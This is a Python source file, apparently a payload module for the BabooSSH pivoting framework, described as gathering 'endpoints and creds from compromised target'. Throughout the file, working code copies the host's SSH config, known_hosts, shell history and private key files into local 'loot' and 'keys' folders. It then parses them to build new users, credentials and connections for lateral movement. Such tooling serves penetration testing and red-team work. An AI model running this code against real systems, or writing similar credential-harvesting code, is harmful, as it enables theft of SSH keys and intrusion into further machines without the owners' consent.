import getpass
import sys
import os
import re
import glob
import ipaddress
import json
import subprocess
import asyncio, asyncssh
from baboossh.endpoint import Endpoint
from baboossh.user import User
from baboossh.path import Path
from baboossh.creds import Creds
from baboossh.connection import Connection

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):

    def __init__(self,socket,connection,wspaceFolder):
        self.socket = socket
        self.connection = connection
        self.wspaceFolder = wspaceFolder
        self.newCreds = []
        self.newUsers = []
        self.newEndpoints = []
        self.newConnections = []

        self.keysHash = {}
        for c in Creds.findAll():
            if c.credsType != "privkey":
                continue
            path = c.obj.keypath
            p = subprocess.run(["sha1sum",path], stdout=subprocess.PIPE)
            out = p.stdout.decode("utf-8")
            h = out.split(" ",1)[0]
            self.keysHash[h] = path


    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "gather"

    @classmethod
    def descr(cls):
        return "Gather endpoints and creds from compromised target"
    
    @classmethod
    def buildParser(cls,parser):
        pass

    @classmethod
    async def run(cls,socket, connection, wspaceFolder, stmt):
        g = cls(socket,connection, wspaceFolder)
        try:
            await g.gather()
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True
    
    async def gather(self):
        print("Starting gathering... ",end="")
        sys.stdout.flush()

        await self.gatherFromConfig()
        historyFiles = await self.listHistoryFiles()
        for historyFile in historyFiles:
            await self.gatherFromHistory(historyFile)
        await self.gatherKeys()
        await self.gatherFromKnown()
        print("Done !")
        print("Users :")
        for user in self.newUsers:
            print(" - "+str(user))
        print("\nCreds :")
        for creds in self.newCreds:
            print(" - "+str(creds))
        print("\nEndpoints :")
        for endpoint in self.newEndpoints:
            print(" - "+str(endpoint))
        print("\nConnections :")
        for connection in self.newConnections:
            print(" - "+str(connection))

    async def hostnameToIP(self,hostname,port=None):
        endpoints = []
        #Check if hostname is IP or Hostname :
        try:
            ipobj = ipaddress.ip_address(hostname)
        except ValueError:
            res = await self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'")
            ips = res.stdout.splitlines()
            for ip in ips:
                ipobj = ipaddress.ip_address(ip)
                if ipobj.is_loopback:
                    continue
                endpoint = Endpoint(ip,port if port is not None else 22)
                if endpoint.getId() is None:
                    endpoint.setFound(self.connection.getEndpoint())
                if not self.connection.inScope():
                    endpoint.unscope()
                try:
                    path = Path(self.connection.getEndpoint().getHost(),endpoint)
                except ValueError:
                    pass
                else:
                    endpoint.save()
                    path.save()
                    endpoints.append(endpoint)
        else:
            if ipobj.is_loopback:
                return []
            endpoint = Endpoint(hostname,port if port is not None else 22)
            if endpoint.getId() is None:
                endpoint.setFound(self.connection.getEndpoint())
            if not self.connection.inScope():
                endpoint.unscope()
            if endpoint.getId() is None:
                endpoint.save()
                self.newEndpoints.append(endpoint)
            try:
                path = Path(self.connection.getEndpoint().getHost(),endpoint)
            except ValueError:
                pass
            else:
                path.save()
                endpoints.append(endpoint)
        return endpoints

    async def gatherFromConfig(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_.ssh_config"
        filepath = os.path.join(lootFolder,filename)
        try:
            await asyncssh.scp((self.socket,".ssh/config"),filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        curHost = None
        for line in lines:
            if line == '':
                continue
            if line[:5].lower() == "Host ".lower():
                if curHost != None:
                    if "host" in curHost.keys():
                        host = curHost["host"]
                    else:
                        host = curHost["name"]
                    if "port" in curHost.keys():
                        port = curHost["port"]
                    else:
                        port=None
                    endpoints = await self.hostnameToIP(host,port)
                    user = None
                    identity = None
                    if "user" in curHost.keys():
                        user = User(curHost["user"])
                        if not self.connection.inScope():
                            user.unscope()
                        if user.getId() is None:
                            user.setFound(self.connection.getEndpoint())
                            user.save()
                            self.newUsers.append(user)
                    if "identity" in curHost.keys():
                        identity = await self.getKeyToCreds(curHost["identity"],".")
                    if user is not None and identity is not None:
                        for endpoint in endpoints:
                            conn = Connection(endpoint,user,identity)
                            conn.save()
                            self.newConnections.append(conn)
                curHost = {}
                curHost["name"] = line.split()[1]
            else:
                [key,val] = line.strip().split(' ',1)
                key = key.lower()
                if key == "user":
                    curHost['user'] = val
                elif key == "port":
                    curHost['port'] = val
                elif key == "hostname":
                    curHost['host'] = val
                elif key == "identityfile":
                    if val[:2] == '~/':
                        val = val[2:]
                    curHost['identity'] = val
        if curHost != None:
            if "host" in curHost.keys():
                host = curHost["host"]
            else:
                host = curHost["name"]
            if "port" in curHost.keys():
                port = curHost["port"]
            else:
                port=None
            endpoints = await self.hostnameToIP(host,port)
            user = None
            identity = None
            if "user" in curHost.keys():
                user = User(curHost["user"])
                if not self.connection.inScope():
                    user.unscope()
                if user.getId() is None:
                    user.setFound(self.connection.getEndpoint())
                    self.newUsers.append(user)
                    user.save()
            if "identity" in curHost.keys():
                identity = await self.getKeyToCreds(curHost["identity"],".")
            if user is not None and identity is not None:
                for endpoint in endpoints:
                    conn = Connection(endpoint,user,identity)
                    conn.save()
                    self.newConnections.append(conn)

    async def gatherFromKnown(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.getEndpoint()).replace(':','-')+"_"+str(self.connection.getUser())+"_.ssh_known_hosts"
        filepath = os.path.join(lootFolder,filename)
        try:
            await asyncssh.scp((self.socket,".ssh/known_hosts"),filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        for line in lines:
            if "|" in line:
                #The entry is hashed, and should be ignored
                continue
            targets = line.partition(' ')[0]
            for target in targets.split(','):
                await self.hostnameToIP(target)
        os.remove(filepath)


    async def gatherKeys(self):
        files = []
        ret = []
        result = await self.socket.run("ls -A .ssh")
        for line in result.stdout.splitlines():
            if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                files.append(line)
        for keyfile in files:
            c = await self.getKeyToCreds(keyfile)

    async def getKeyToCreds(self,keyfile,basePath=".ssh"):
        if basePath != ".":
            keyfile = os.path.join(basePath,keyfile)
        from baboossh.params import Extensions
        keysFolder = os.path.join(self.wspaceFolder,"keys")
        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_"+keyfile.replace("/","_")
        filepath = os.path.join(keysFolder,filename)
        try:
            await asyncssh.scp((self.socket,keyfile),filepath)
        except Exception as e:
            print(e)
            return None
        subprocess.run(["chmod","600",filepath])
        p = subprocess.run(["sha1sum",filepath], stdout=subprocess.PIPE)
        output = p.stdout.decode("utf-8")
        output = output.split(" ",1)[0]
        if output in self.keysHash.keys():
            if filepath != self.keysHash[output]:
                os.remove(filepath)
            return None
        valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
        if valid:
            self.keysHash[output] = filepath
            c= { "passphrase":"","keypath":filepath,"haspass":haspass}
            cred = Creds("privkey",json.dumps(c))
            if not self.connection.inScope():
                cred.unscope()
            if cred.getId() is None:
                cred.setFound(self.connection.getEndpoint())
                cred.save()
                self.newCreds.append(cred)
            return cred
        else:
            os.remove(filepath)
        return None

    async def listHistoryFiles(self):
        ret = []
        result = await self.socket.run("ls -A")
        for line in result.stdout.splitlines():
            if "history" in line:
                ret.append(line)
        return ret

    async def gatherFromHistory(self,historyFile):
        result = await self.socket.run("cat "+historyFile)
        lines = result.stdout.splitlines()
        for line in lines:
            if re.search(r'^ *ssh ',line):
                option = ""
                words = line.split()
                host = False
                port = None
                user = None
                identity = None

                for i in range(1,len(words)):
                    if option != "":
                        if option == "identity":
                            identity = words[i]
                            if identity[:2] == '~/':
                                identity = identity[2:]
                        elif option == "port":
                            port = words[i]
                        option = ""
                    elif words[i][0] == "-":
                        if words[i] == "-i":
                            option = "identity"
                        elif words[i] == "-p":
                            option = "port"
                        else:
                            option = words[i]
                    elif not host:
                        if '@' in words[i]:
                            user,hostname = words[i].split("@",1)
                        else:
                            hostname = words[i]
                        host = True
                if not host:
                    continue
                endpoints = await self.hostnameToIP(hostname,port)
                if user is not None:
                    user = User(user)
                    if not self.connection.inScope():
                        user.unscope()
                    if user.getId() is None:
                        user.setFound(self.connection.getEndpoint())
                        user.save()
                        self.newUsers.append(user)
                if identity is not None:
                    identity = await self.getKeyToCreds(identity,".")
                if user is not None and identity is not None:
                    for endpoint in endpoints:
                        conn = Connection(endpoint,user,identity)
                        conn.save()
                        self.newConnections.append(conn)

